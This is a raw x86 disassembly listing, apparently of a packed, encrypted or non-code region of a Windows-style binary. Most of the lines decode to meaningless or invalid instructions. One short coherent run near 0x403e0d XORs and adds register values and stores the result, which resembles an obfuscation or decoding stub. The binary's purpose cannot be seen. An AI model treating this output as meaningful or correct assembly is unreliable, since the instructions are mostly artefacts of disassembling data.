  40382b:	fimul  DWORD PTR [eax+0x7a7a2d84]
  403831:	shr    al,1
  403833:	repnz xor DWORD PTR [esi+ebx*2],eax
  403837:	das    
  403838:	in     eax,0x9d
  40383a:	push   ecx
  40383b:	mov    esi,DWORD PTR [eax-0x1c]
  40383e:	cmp    esp,DWORD PTR [edx-0x3e189d49]
  403844:	or     eax,0xffffffdf
  403847:	imul   ecx,DWORD PTR [eax+edi*1+0x7c],0xffffff89
  40384c:	mov    ecx,DWORD PTR [ebx-0x58]
  40384f:	or     esp,ecx
  403851:	jge    0x40385d
  403853:	pushf  
  403854:	mov    edx,0xadfda5d3
  403859:	inc    ebp
  40385a:	fwait
  40385b:	mov    WORD PTR [ecx+0x506d1f96],?
  403861:	xchg   esi,eax
  403862:	sbb    BYTE PTR [ecx],0x46
  403865:	cmp    dl,bl
  403867:	mov    ebp,0x727e508a
  40386c:	or     al,BYTE PTR [edi+0xa]
  40386f:	mov    eax,0x4ac7101f
  403874:	(bad)  
  403875:	xchg   cl,cl
  403877:	mov    eax,0x96450b9e
  40387c:	jle    0x40385b
  40387e:	call   0x2cc89e79
  403883:	repz les esi,FWORD PTR [edx+0x5e1b8d18]
  40388a:	scas   eax,DWORD PTR es:[edi]
  40388b:	cmc    
  40388c:	call   0xa86bed90
  403891:	inc    edx
  403892:	shl    BYTE PTR [eax],0x9d
  403895:	pushf  
  403896:	inc    BYTE PTR [ebx+0x57]
  403899:	xlat   BYTE PTR ds:[ebx]
  40389a:	data16 int 0x8b
  40389d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40389e:	mov    dh,0xf1
  4038a0:	cmp    DWORD PTR [edi+0x21519682],ebx
  4038a6:	(bad)  
  4038a7:	and    ecx,ebx
  4038a9:	jne    0x403901
  4038ab:	mov    ebp,0x7042bfdd
  4038b0:	ins    DWORD PTR es:[edi],dx
  4038b1:	gs jle 0x403840
  4038b4:	dec    ebx
  4038b5:	clc    
  4038b6:	popa   
  4038b7:	jae    0x40385f
  4038b9:	lods   eax,DWORD PTR ds:[esi]
  4038ba:	push   esp
  4038bb:	inc    ecx
  4038bc:	outs   dx,BYTE PTR ds:[esi]
  4038bd:	imul   eax,DWORD PTR [eax-0x54],0xe908048a
  4038c4:	call   0xc6d3:0xce000002
  4038cb:	ror    ecx,0xd9
  4038ce:	(bad)  
  4038d0:	mov    ebp,0x5d405f3
  4038d5:	sbb    BYTE PTR [edx+0x781d14a2],bh
  4038db:	js     0x4038db
  4038dd:	jle    0x403957
  4038df:	js     0x4038e2
  4038e1:	(bad)
  4038e4:	sbb    edx,DWORD PTR ds:0xdd6d7220
  4038ea:	imul   esi,eax,0xffffffe0
  4038ed:	pop    esi
  4038ee:	inc    eax
  4038ef:	dec    ebx
  4038f0:	in     eax,dx
  4038f1:	mov    ebx,0x3a77a42e
  4038f6:	(bad)  
  4038f7:	mov    ecx,0x35a26cce
  4038fc:	mov    ebp,0xd9b95e14
  403901:	push   ds
  403902:	loope  0x4038c1
  403904:	add    DWORD PTR [esi],edx
  403906:	jbe    0x4038d6
  403908:	cmp    al,0x22
  40390a:	push   esi
  40390b:	dec    ebx
  40390c:	xchg   esi,eax
  40390d:	or     ebp,DWORD PTR [edx-0x6b]
  403910:	pushf  
  403911:	cwde   
  403912:	cli    
  403913:	adc    DWORD PTR [eax+0x48],0xffffffda
  403917:	rol    ah,1
  403919:	cs xor ebx,ebp
  40391c:	mov    edi,0xd9777d6
  403921:	push   edi
  403922:	pop    ebx
  403923:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403924:	pop    esi
  403925:	inc    ebx
  403926:	aas    
  403927:	call   0x9fbd8030
  40392c:	in     eax,0x96
  40392e:	iret   
  40392f:	call   0x1db2:0xe2d36dae
  403936:	push   esp
  403937:	dec    esp
  403938:	xchg   ecx,eax
  403939:	jbe    0x40399b
  40393b:	sub    al,0x81
  40393e:	push   ss
  40393f:	nop
  403940:	rcl    DWORD PTR [ebp-0x2c504389],1
  403946:	fdiv   DWORD PTR [eax-0x44]
  403949:	push   0xffffffea
  40394b:	jbe    0x40396c
  40394d:	mov    bh,0x86
  40394f:	mov    al,0x40
  403951:	lock idiv DWORD PTR [edi]
  403954:	dec    ebp
  403955:	mov    cl,0xf2
  403957:	mov    eax,ds:0xf73995ad
  40395c:	push   ebx
  40395d:	mov    DWORD PTR [esp+ecx*4+0x47],edx
  403961:	call   0xd3c7e720
  403966:	std    
  403967:	cmp    eax,0x510d519d
  40396c:	mov    cl,0xd8
  40396e:	jle    0xf3cc988b
  403974:	push   ecx
  403975:	inc    eax
  403976:	loopne 0x4039e6
  403978:	test   BYTE PTR [edx+0x5f873103],0xbe
  40397f:	lock pusha 
  403981:	sub    al,0xe2
  403983:	sar    BYTE PTR [ebx+0x57fd0b03],0xb8
  40398a:	inc    esi
  40398b:	cmc    
  40398c:	enter  0xb47d,0x7
  403990:	jge    0x403a02
  403992:	fcomp  DWORD PTR [edi]
  403994:	ds fcomip st,st(0)
  403997:	dec    ebx
  403998:	dec    esp
  403999:	cld    
  40399a:	pop    ss
  40399b:	scas   al,BYTE PTR es:[edi]
  40399c:	lods   al,BYTE PTR ds:[esi]
  40399d:	or     BYTE PTR [esp+ecx*4],ch
  4039a0:	lods   eax,DWORD PTR ds:[esi]
  4039a1:	sbb    DWORD PTR [edi],esp
  4039a3:	jmp    0xd11b:0x113511b4
  4039aa:	imul   esi,ebx,0x10
  4039ad:	clc    
  4039ae:	ja     0x403976
  4039b0:	jg     0x403971
  4039b2:	inc    DWORD PTR [eax]
  4039b4:	pop    ebp
  4039b5:	imul   esp,DWORD PTR [ebp-0x7c78522],0x50
  4039bc:	enter  0xc687,0xcb
  4039c0:	xor    DWORD PTR [esi+ebp*2-0x52d9c36c],esp
  4039c7:	dec    edx
  4039c8:	cmp    dh,cl
  4039ca:	retf   
  4039cb:	jmp    0x83c10f1e
  4039d0:	mov    DWORD PTR fs:[eax-0xc09299],ecx
  4039d7:	mov    bl,0xc4
  4039d9:	xor    eax,0xfdf3624a
  4039de:	xchg   edi,eax
  4039df:	push   esi
  4039e0:	jns    0x4039bf
  4039e2:	imul   edi,ebx,0xffffffad
  4039e5:	push   0x8f89d74
  4039ea:	xchg   esp,eax
  4039eb:	inc    ebp
  4039ec:	fdivr  st(7),st
  4039ee:	adc    cl,0x33
  4039f1:	add    ah,ch
  4039f3:	sbb    BYTE PTR [ebx-0x5f765be],dl
  4039f9:	jle    0x403987
  4039fb:	stos   BYTE PTR es:[edi],al
  4039fc:	inc    edi
  4039fd:	dec    ebp
  4039fe:	xchg   esp,eax
  4039ff:	xchg   esp,eax
  403a00:	nop
  403a01:	sub    ebx,DWORD PTR [edx]
  403a03:	xor    al,0xbc
  403a05:	cmp    bh,dh
  403a07:	jg     0x403a7d
  403a09:	in     eax,0x5c
  403a0b:	xor    cl,BYTE PTR [ebx+edi*2]
  403a0e:	stos   DWORD PTR es:[edi],eax
  403a0f:	mov    ds:0x9b8976e8,al
  403a14:	or     eax,0xf197dd27
  403a19:	mov    ah,0x4d
  403a1b:	lds    ebx,FWORD PTR [ecx+eax*4+0x46]
  403a1f:	inc    esp
  403a20:	test   edx,edx
  403a22:	nop
  403a23:	xor    BYTE PTR [ebp-0x6],0xb0
  403a27:	xor    al,BYTE PTR [edx-0x19525160]
  403a2d:	aas    
  403a2e:	outs   dx,BYTE PTR ds:[esi]
  403a2f:	fidivr WORD PTR [esi+0x5e]
  403a32:	sbb    bl,bh
  403a34:	pop    ecx
  403a35:	ins    DWORD PTR es:[edi],dx
  403a36:	pop    eax
  403a37:	aad    0xd7
  403a39:	mov    edi,0xf9b9bc96
  403a3e:	call   0x13bfbd6c
  403a43:	stos   DWORD PTR es:[edi],eax
  403a44:	cmp    ah,ah
  403a46:	jl     0x403a26
  403a48:	and    ecx,eax
  403a4a:	mov    esp,0xf9313e7f
  403a4f:	push   ecx
  403a50:	lods   al,BYTE PTR ds:[esi]
  403a51:	outs   dx,DWORD PTR ds:[esi]
  403a52:	leave  
  403a53:	pushw  0xffe3
  403a56:	pop    es
  403a57:	mov    dl,0x34
  403a59:	gs xchg ecx,eax
  403a5b:	jb     0x4039dd
  403a5d:	setne  BYTE PTR [ebp-0x19d54afb]
  403a64:	fld    QWORD PTR [ebp+0x3d]
  403a67:	mov    ecx,0x299b51a3
  403a6c:	sti    
  403a6d:	push   0xb
  403a6f:	outs   dx,DWORD PTR ds:[esi]
  403a70:	call   FWORD PTR [ecx-0x63]
  403a73:	pusha  
  403a74:	lods   eax,DWORD PTR ds:[esi]
  403a75:	fmul   DWORD PTR [ebx-0x1eb3d99f]
  403a7b:	loop   0x403a5c
  403a7d:	repnz scas al,BYTE PTR es:[edi]
  403a7f:	or     al,0x71
  403a81:	xor    al,0xb0
  403a83:	stos   DWORD PTR es:[edi],eax
  403a84:	xchg   esp,eax
  403a85:	mov    ah,0x3e
  403a87:	mov    bl,bh
  403a89:	mov    eax,ds:0xbca9d5cb
  403a8e:	cli    
  403a8f:	sbb    BYTE PTR [ebx],dl
  403a91:	jmp    0x4d23:0xc99d4e26
  403a98:	shr    DWORD PTR [eax+0x49224e38],cl
  403a9e:	jmp    0x67d64ac1
  403aa3:	cwde   
  403aa4:	iret   
  403aa5:	fsub   DWORD PTR [eax]
  403aa7:	lahf   
  403aa8:	add    ebp,DWORD PTR [edi]
  403aaa:	shr    BYTE PTR [ebp-0x26e0186],cl
  403ab0:	out    dx,al
  403ab1:	out    0x96,al
  403ab3:	(bad)  
  403ab4:	mov    al,BYTE PTR fs:0x19492c13
  403abb:	jp     0x403a94
  403abd:	repz fsubrp st(5),st
  403ac0:	mov    eax,0x7fd7a4aa
  403ac5:	cmp    DWORD PTR [edx],ebx
  403ac7:	aaa    
  403ac8:	adc    DWORD PTR [ebp-0x2f002977],esi
  403ace:	ret    
  403acf:	ror    DWORD PTR [edx+0x1ea0bf30],cl
  403ad5:	aad    0xa2
  403ad7:	cmp    DWORD PTR [ebx],eax
  403ad9:	jp     0x403aa0
  403adb:	fwait
  403adc:	jmp    0xc63d:0x8e720a8a
  403ae3:	push   0xdfae483c
  403ae8:	popf   
  403ae9:	scas   eax,DWORD PTR es:[edi]
  403aea:	ss aas 
  403aec:	test   BYTE PTR ds:0x325eec02,ah
  403af2:	inc    DWORD PTR [edx-0x28]
  403af5:	jnp    0x403a8e
  403af7:	out    0x8e,eax
  403af9:	fs push eax
  403afb:	xor    al,al
  403afd:	aam    0xa5
  403aff:	pop    ss
  403b00:	cld    
  403b01:	dec    esp
  403b02:	jbe    0x403b2f
  403b04:	push   ss
  403b05:	cmp    esp,DWORD PTR [esi-0x32]
  403b08:	and    al,0x8f
  403b0a:	or     eax,0x83515fb6
  403b0f:	das    
  403b10:	repz push ds
  403b12:	sbb    ecx,DWORD PTR [eax-0x6bd09614]
  403b18:	enter  0xb3b8,0x49
  403b1c:	mov    ebp,0x1227fef
  403b21:	lods   al,BYTE PTR ds:[esi]
  403b22:	mov    eax,ds:0xfd91e33b
  403b27:	out    dx,eax
  403b28:	pop    ebx
  403b29:	sub    cl,BYTE PTR [ebx]
  403b2b:	sahf   
  403b2c:	loope  0x403ad4
  403b2e:	push   ebp
  403b2f:	mov    ebx,0x7cccc2d3
  403b34:	or     ecx,DWORD PTR [ecx]
  403b36:	stos   BYTE PTR es:[edi],al
  403b37:	sub    DWORD PTR [ecx+0x71e8f15f],edx
  403b3d:	fsubp  st(1),st
  403b3f:	addr16 out dx,al
  403b41:	sbb    al,0xc7
  403b43:	inc    esp
  403b44:	pop    ebx
  403b45:	outs   dx,DWORD PTR ds:[esi]
  403b46:	jne    0x403b87
  403b48:	cs test BYTE PTR ss:[ebp+0x2dcadf65],cl
  403b50:	loop   0x403b31
  403b52:	dec    ecx
  403b53:	ins    BYTE PTR es:[edi],dx
  403b54:	push   esi
  403b55:	cmp    DWORD PTR es:[ebx],edi
  403b58:	mov    ah,0x36
  403b5a:	and    edx,edx
  403b5c:	lods   eax,DWORD PTR ds:[esi]
  403b5d:	retf   0xe565
  403b60:	and    eax,0x343b0498
  403b65:	inc    ebx
  403b66:	cmp    al,0xc5
  403b68:	je     0x4040bd
  403b6e:	jmp    0x403e0d
  403b73:	leave  
  403b74:	rol    dl,cl
  403b76:	rcr    ecx,cl
  403b78:	rcr    ecx,cl
  403b7a:	(bad)  
  403b7c:	ss push edx
  403b7e:	fwait
  403b7f:	inc    ecx
  403b80:	add    ebx,DWORD PTR [edi+0x78239af4]
  403b86:	js     0x403b86
  403b88:	jle    0x403c02
  403b8a:	js     0x403b5a
  403b8c:	mov    esp,0xc81a29f
  403b91:	sub    eax,DWORD PTR [ebx+0x6d]
  403b94:	std    
  403b95:	jl     0x403bb8
  403b97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b98:	sub    eax,0xe8b87526
  403b9d:	fsincos 
  403b9f:	and    eax,0xbad3fa94
  403ba4:	and    BYTE PTR [esi+0x617a86f1],al
  403baa:	test   eax,0x9029398f
  403baf:	(bad)  
  403bb0:	or     DWORD PTR [esi],ecx
  403bb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bb3:	inc    edi
  403bb4:	(bad)  [eax+0x48e63261]
  403bba:	and    al,0x2f
  403bbc:	retf   0x823c
  403bbf:	inc    esp
  403bc0:	jno    0x403c33
  403bc2:	xor    ebx,ecx
  403bc4:	inc    WORD PTR [eax+0x47]
  403bc8:	inc    esi
  403bc9:	ret    0x1b62
  403bcc:	push   ebp
  403bcd:	xchg   ecx,eax
  403bce:	mov    eax,0x2148fe05
  403bd3:	push   esi
  403bd4:	fiadd  WORD PTR [ebx]
  403bd6:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  403bd8:	and    ch,BYTE PTR [esi+0x26]
  403bdb:	xor    dl,BYTE PTR [eax+0x43]
  403bde:	sbb    al,0xdd
  403be0:	test   eax,0x538189e2
  403be5:	outs   dx,BYTE PTR ds:[esi]
  403be6:	dec    ebx
  403be7:	fidivr WORD PTR [eax]
  403be9:	mov    eax,0x6f1cd62a
  403bee:	scas   eax,DWORD PTR es:[edi]
  403bef:	jecxz  0x403bc6
  403bf1:	pop    ss
  403bf2:	outs   dx,DWORD PTR ds:[esi]
  403bf3:	pop    eax
  403bf4:	sbb    eax,0x349f820a
  403bf9:	pop    ebp
  403bfa:	or     edi,edi
  403bfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bfd:	and    BYTE PTR [ebx-0x51761aec],ah
  403c03:	call   0x3e64:0x4a224539
  403c0a:	push   es
  403c0b:	lods   al,BYTE PTR ds:[esi]
  403c0c:	aam    0xf
  403c0e:	das    
  403c0f:	jae    0x403b93
  403c11:	fmul   st,st(6)
  403c13:	jp     0x403c75
  403c15:	mov    DWORD PTR [ebp+0x40e7ecb3],esi
  403c1b:	add    eax,0x5a7e27b8
  403c20:	lahf   
  403c21:	mov    esp,0xccf22693
  403c26:	mov    eax,ds:0xaace04da
  403c2b:	retf   0x2e5f
  403c2e:	push   cs
  403c2f:	test   al,0xba
  403c31:	push   ecx
  403c32:	cdq    
  403c33:	push   ebp
  403c34:	push   esp
  403c35:	xchg   ebp,eax
  403c36:	jae    0x403bc4
  403c38:	mov    edi,edx
  403c3a:	inc    esp
  403c3b:	retf   
  403c3c:	and    DWORD PTR [ecx+ebx*2-0x22],edx
  403c40:	pop    ecx
  403c41:	jo     0x403c03
  403c43:	push   edx
  403c44:	call   0x41f6:0x1fe9bb06
  403c4b:	mov    eax,0xc8a5f627
  403c50:	jp     0x403bd8
  403c52:	iret   
  403c53:	mov    bl,0xce
  403c55:	jbe    0x403c7a
  403c57:	jmp    0xb66291b9
  403c5c:	inc    eax
  403c5d:	xchg   ebx,eax
  403c5e:	cli    
  403c5f:	shl    DWORD PTR [ebx-0x7608a682],1
  403c65:	in     al,0xfe
  403c67:	cli    
  403c68:	sti    
  403c69:	push   ebx
  403c6a:	pop    ds
  403c6b:	jecxz  0x403c70
  403c6d:	mov    ah,0x8c
  403c6f:	out    0x79,al
  403c71:	and    eax,0x916a68ee
  403c76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c77:	push   cs
  403c78:	jns    0x403c02
  403c7a:	out    dx,ax
  403c7c:	sar    BYTE PTR [ecx-0x56bbbe44],1
  403c82:	mov    WORD PTR [esi],?
  403c84:	xor    DWORD PTR [ecx-0x575d2c7b],eax
  403c8a:	mov    ah,0xa1
  403c8c:	lock xchg esp,eax
  403c8e:	cwde   
  403c8f:	sub    al,BYTE PTR [edx]
  403c91:	not    DWORD PTR [ebx+0x69]
  403c94:	sub    DWORD PTR [ecx-0x320362b1],eax
  403c9a:	mov    edx,0x2ebf00ed
  403c9f:	mov    eax,0x719e1e4f
  403ca4:	mov    eax,0x86c28fa9
  403ca9:	pusha  
  403caa:	iret   
  403cab:	inc    ecx
  403cac:	adc    BYTE PTR [edi],bh
  403cae:	fdiv   QWORD PTR [esi]
  403cb0:	sbb    eax,DWORD PTR [ebx+eax*2]
  403cb3:	mov    ebx,0xd5e3df80
  403cb8:	pusha  
  403cb9:	xchg   edx,eax
  403cba:	push   edx
  403cbb:	in     al,dx
  403cbc:	push   eax
  403cbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cbe:	cmc    
  403cbf:	jp     0x403c5c
  403cc1:	sbb    al,cl
  403cc3:	(bad)  
  403cc4:	xchg   dl,bl
  403cc6:	sar    BYTE PTR [eax+eax*4],0x7a
  403cca:	outs   dx,DWORD PTR ds:[esi]
  403ccb:	sar    BYTE PTR [ebp-0x7a],1
  403cce:	sbb    eax,0xdb5e16f8
  403cd3:	lahf   
  403cd4:	bound  eax,QWORD PTR [esi]
  403cd6:	js     0x403cbe
  403cd8:	(bad)  
  403cd9:	sub    al,BYTE PTR [esi]
  403cdb:	ror    esp,cl
  403cdd:	les    edx,FWORD PTR [esi+0x1d2e914a]
  403ce3:	hlt    
  403ce4:	loope  0x403d35
  403ce6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ce7:	std    
  403ce8:	iret   
  403ce9:	out    dx,al
  403cea:	mov    edx,0x91d5ea63
  403cef:	aam    0xd5
  403cf1:	sbb    DWORD PTR [ebx-0x34f184c1],0x76
  403cf8:	call   0x490590b4
  403cfd:	loopne 0x403d57
  403cff:	mov    BYTE PTR [eax+0x1b],bl
  403d02:	inc    esi
  403d03:	rcl    BYTE PTR [esi+ebx*4+0x7fa4d182],0x6f
  403d0b:	xchg   ebp,eax
  403d0c:	fst    DWORD PTR [eax-0x53]
  403d0f:	rcl    BYTE PTR [esi-0x4119f270],0x74
  403d16:	js     0x403d62
  403d18:	sti    
  403d19:	xlat   BYTE PTR ds:[ebx]
  403d1a:	mov    edi,0x203d9c4e
  403d1f:	push   ecx
  403d20:	retf   
  403d21:	and    DWORD PTR [ebp+0x6a],eax
  403d24:	(bad)  [ebp-0x13]
  403d27:	push   0x39c5ee6c
  403d2c:	call   FWORD PTR [ecx]
  403d2e:	cmp    DWORD PTR [ebx+0x1ad89709],edx
  403d34:	xchg   DWORD PTR ss:[edx-0x6074d047],ecx
  403d3b:	adc    al,0xc3
  403d3d:	xchg   ebx,eax
  403d3e:	push   edx
  403d3f:	scas   eax,DWORD PTR es:[edi]
  403d40:	dec    ecx
  403d41:	sahf   
  403d42:	dec    edx
  403d43:	xchg   DWORD PTR [edx-0x2c],edi
  403d46:	fwait
  403d47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d48:	mov    edi,0x8420c727
  403d4d:	jb     0x403d7c
  403d4f:	lods   al,BYTE PTR ds:[esi]
  403d50:	dec    ecx
  403d51:	mov    ecx,0xe083e40f
  403d56:	(bad)  [ebp-0x3a]
  403d59:	test   al,0x2d
  403d5b:	aas    
  403d5c:	mov    ah,0x70
  403d5e:	xor    dl,BYTE PTR [ebx]
  403d60:	lahf   
  403d61:	add    DWORD PTR fs:[esi],eax
  403d64:	sub    DWORD PTR [ecx+0x2],ecx
  403d67:	pop    edx
  403d68:	out    0x45,eax
  403d6a:	mov    ch,0x8e
  403d6c:	outs   dx,DWORD PTR ds:[esi]
  403d6d:	cwde   
  403d6e:	popf   
  403d6f:	sbb    DWORD PTR [eax-0x2920449b],esp
  403d75:	push   edi
  403d76:	in     eax,dx
  403d77:	cmp    DWORD PTR [ebx+0x769dd737],ebp
  403d7d:	test   eax,0x3a7aa787
  403d82:	push   edx
  403d83:	daa    
  403d84:	je     0x403dac
  403d86:	in     al,0xe5
  403d88:	out    dx,eax
  403d89:	pop    ss
  403d8a:	adc    BYTE PTR [edx],cl
  403d8c:	loop   0x403d6a
  403d8e:	js     0x403d13
  403d90:	cmp    al,0x9f
  403d92:	fild   WORD PTR [esi+edx*1-0x24]
  403d96:	xchg   ebp,eax
  403d97:	mov    ebp,0xbaf33886
  403d9c:	jmp    0x42dd:0xe7c4d0dd
  403da3:	xor    al,0x30
  403da5:	push   ebx
  403da6:	push   ecx
  403da7:	retf   
  403da8:	sub    DWORD PTR [esi],esi
  403daa:	sbb    edx,edi
  403dac:	mov    bl,BYTE PTR [eax-0x1]
  403daf:	dec    BYTE PTR [ecx+edx*1+0x3c]
  403db3:	jae    0x403d92
  403db5:	xor    bl,bl
  403db7:	xchg   ebx,eax
  403db8:	es pop edx
  403dba:	ficomp DWORD PTR [esi-0x391e4027]
  403dc0:	pop    es
  403dc1:	sbb    al,0x25
  403dc3:	jge    0x403d83
  403dc5:	mov    ?,WORD PTR [edx]
  403dc7:	dec    ebp
  403dc8:	and    eax,0x13bea098
  403dcd:	mov    eax,ds:0x345384d0
  403dd2:	adc    eax,0xaf6558b5
  403dd7:	daa    
  403dd8:	inc    ebx
  403dd9:	jno    0x403d6e
  403ddb:	(bad)  
  403ddc:	cmp    edi,edi
  403dde:	daa    
  403ddf:	mov    eax,ds:0xea6b0b1e
  403de4:	or     cl,BYTE PTR [ebx]
  403de6:	mov    ds:0x653d64a5,eax
  403deb:	cs aas 
  403ded:	test   eax,0x495f2dbc
  403df2:	jecxz  0x403e10
  403df4:	and    eax,edi
  403df6:	cs xchg ebp,eax
  403df8:	call   0x53f6:0x4c908b6
  403dff:	xchg   ecx,eax
  403e00:	sar    DWORD PTR [edi+0x11672646],1
  403e06:	sar    ecx,0x8c
  403e09:	push   eax
  403e0a:	jmp    0x403d9f
  403e0c:	pushf  
  403e0d:	mov    eax,DWORD PTR [ebp+0x8]
  403e10:	mov    ecx,DWORD PTR [ebp-0x8]
  403e13:	xor    eax,esi
  403e15:	add    eax,edi
  403e17:	mov    DWORD PTR [ecx],eax
  403e19:	jmp    0x404380
  403e1e:	jmp    0x4040bd
  403e23:	ds retf 0xcdca
  403e27:	retf   0xd9cd
  403e2a:	fldenv ds:0xcedd8593
  403e30:	enter  0x5171,0x18
  403e34:	and    BYTE PTR [eax+0x78],bh
  403e37:	(bad)  
  403e38:	jle    0x403eb2
  403e3a:	js     0x403eb8
  403e3c:	push   0xffffffc3
  403e3e:	in     eax,0xbf
  403e40:	retf   
  403e41:	js     0x403e49
  403e43:	je     0x403e76
  403e45:	nop
  403e46:	sbb    eax,0x92fe744c
  403e4b:	in     eax,0xd6
  403e4d:	lods   eax,DWORD PTR ds:[esi]
  403e4e:	pop    es
  403e4f:	dec    edi
  403e50:	xchg   esp,eax
  403e51:	pop    esi
  403e52:	xchg   edx,eax
  403e53:	add    DWORD PTR [eax],esp
  403e55:	push   ebx
  403e56:	popa   
  403e57:	cli    
  403e58:	pop    ss
  403e59:	(bad)  
  403e5a:	fld    TBYTE PTR [edx-0x3d]
  403e5d:	adc    DWORD PTR [ebx-0x758d6f4a],eax
  403e63:	sub    BYTE PTR [edi-0x4d0ee2d8],bh
  403e69:	lods   eax,DWORD PTR ds:[esi]
  403e6a:	push   esp
  403e6b:	das    
  403e6c:	push   0x97ee2388
  403e71:	enter  0x9814,0x9a
  403e75:	iret   
  403e76:	add    eax,0xe545e0c
  403e7b:	cmp    bh,0x11
  403e7e:	push   es
  403e7f:	jg     0x403e3a
  403e81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e82:	inc    esp
  403e83:	out    0x30,al
  403e85:	xchg   ecx,eax
  403e86:	jecxz  0x403e63
  403e88:	out    0xf3,al
  403e8a:	push   ebx
  403e8b:	out    dx,al
  403e8c:	cld    
  403e8d:	dec    edx
  403e8e:	inc    edi
  403e8f:	xor    al,BYTE PTR [ecx+ebx*1-0x36ff5540]
  403e96:	(bad)  
  403e97:	fdivr  QWORD PTR [ebp+0x7bcbc6c4]
  403e9d:	dec    ebx
  403e9e:	(bad)  
  403e9f:	push   ecx
  403ea0:	dec    ecx
  403ea1:	outs   dx,DWORD PTR ds:[esi]
  403ea2:	(bad)  
  403ea3:	mov    dl,0xe0
  403ea5:	div    BYTE PTR [eax]
  403ea7:	in     eax,dx
  403ea8:	pop    ecx
  403ea9:	test   BYTE PTR [eax-0x1d3601e1],cl
  403eaf:	jge    0x403ece
  403eb1:	cmp    eax,0x12ae2533
  403eb6:	shl    BYTE PTR [ecx-0x73be4af0],1
  403ebc:	sbb    dl,BYTE PTR [eax+0x7f]
  403ebf:	mov    edi,0xba2fbf96
  403ec4:	push   edi
  403ec5:	popfw  
  403ec7:	test   dh,cl
  403ec9:	and    eax,0xe1fdc356
  403ece:	bound  ecx,QWORD PTR [ebp-0x2bedec57]
  403ed4:	ins    BYTE PTR es:[edi],dx
  403ed5:	scas   al,BYTE PTR es:[edi]
  403ed6:	fmul   st,st(2)
  403ed8:	test   eax,0x37619622
  403edd:	shl    BYTE PTR [esi+0x61479166],1
  403ee3:	outs   dx,BYTE PTR ds:[esi]
  403ee4:	call   0x3dba:0xc96726a6
  403eeb:	jbe    0x403f1c
  403eed:	jp     0x403f59
  403eef:	inc    edi
  403ef0:	stc    
  403ef1:	mov    edi,0xe709e776
  403ef6:	aas    
  403ef7:	add    ebx,edi
  403ef9:	aas    
  403efa:	mov    cl,0x80
  403efc:	jb     0x403f52
  403efe:	jl     0x403ec9
  403f00:	ss in  al,0x35
  403f03:	ja     0x403eff
  403f05:	das    
  403f06:	or     al,0xcc
  403f08:	fnsave [edi+0xd]
  403f0b:	adc    DWORD PTR [esp+esi*1],edx
  403f0e:	in     eax,dx
  403f0f:	fs (bad) 
  403f11:	mov    ecx,0x513d23af
  403f16:	mov    edx,0x250b9be
  403f1b:	add    ecx,ebx
  403f1d:	mov    eax,0x5f492f63
  403f22:	inc    esi
  403f23:	jge    0x403f37
  403f25:	mov    ds:0xcb733bc4,eax
  403f2a:	sahf   
  403f2b:	xchg   ebp,eax
  403f2c:	pushf  
  403f2d:	sbb    bh,BYTE PTR [esi+0x2e1df75b]
  403f33:	std    
  403f34:	lods   eax,DWORD PTR ds:[esi]
  403f35:	je     0x403ec7
  403f37:	(bad)  
  403f38:	fld    DWORD PTR [ebx-0x7bd6aded]
  403f3e:	(bad)  
  403f3f:	adc    DWORD PTR [eax+0x45],ecx
  403f42:	lods   eax,DWORD PTR ds:[esi]
  403f43:	sbb    eax,0xc49479c
  403f48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f49:	icebp  
  403f4a:	nop
  403f4b:	lds    esi,FWORD PTR [edx+0x5d1417]
  403f51:	dec    edx
  403f52:	mov    eax,0x9b4d3830
  403f57:	fs mov bl,0x5d
  403f5a:	cs mov cl,0x59
  403f5d:	inc    ecx
  403f5e:	repz cmp al,0x5f
  403f61:	fwait
  403f62:	inc    esi
  403f63:	pop    esi
  403f64:	lods   al,BYTE PTR ds:[esi]
  403f65:	adc    cl,BYTE PTR [eax+0x69]
  403f68:	ret    
  403f69:	ret    
  403f6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f6b:	mov    bl,0x9c
  403f6d:	xchg   ebx,eax
  403f6e:	test   DWORD PTR [eax-0x6b786472],eax
  403f74:	pop    ecx
  403f75:	mov    bh,0xc8
  403f77:	in     eax,dx
  403f78:	lds    edx,FWORD PTR [eax-0x7e]
  403f7b:	dec    DWORD PTR [ebp-0x7ccd5bb4]
  403f81:	mov    ds,edi
  403f83:	push   esp
  403f84:	out    dx,al
  403f85:	aam    0x23
  403f87:	cli    
  403f88:	shl    esp,1
  403f8a:	or     ecx,ebx
  403f8c:	scas   eax,DWORD PTR es:[edi]
  403f8d:	stc    
  403f8e:	push   ds
  403f8f:	inc    ebx
  403f90:	mov    fs,edx
  403f92:	sar    BYTE PTR [esp+ebx*8],1
  403f95:	xor    BYTE PTR [eax-0x78af570f],bh
  403f9b:	mov    bl,BYTE PTR [edx-0x40]
  403f9e:	sub    BYTE PTR [esi-0x3e],dl
  403fa1:	(bad)  
  403fa2:	and    edx,eax
  403fa4:	sub    al,0xfb
  403fa6:	jmp    0xf84125a4
  403fab:	mov    bh,0x7f
  403fad:	ror    DWORD PTR ds:[edx],0x38
  403fb1:	xchg   DWORD PTR [ecx],edi
  403fb3:	shr    DWORD PTR [eax+0x69],0xec
  403fb7:	les    ebp,FWORD PTR [ecx-0x2b]
  403fba:	adc    al,0x8d
  403fbc:	les    ebp,FWORD PTR [ebp-0x10]
  403fbf:	mov    bh,0x86
  403fc1:	xor    esi,DWORD PTR [edx+0x59]
  403fc4:	xchg   esp,eax
  403fc5:	mov    fs,esp
  403fc7:	mov    eax,0xdd03bb80
  403fcc:	mov    eax,0xf23714d7
  403fd1:	mov    BYTE PTR [ecx],ch
  403fd3:	add    eax,0x803db2d4
  403fd8:	sub    ebx,ebp
  403fda:	in     al,0x29
  403fdc:	jge    0x403fc0
  403fde:	in     eax,0x35
  403fe0:	or     DWORD PTR [ebx],ebx
  403fe2:	hlt    
  403fe3:	xchg   ebp,eax
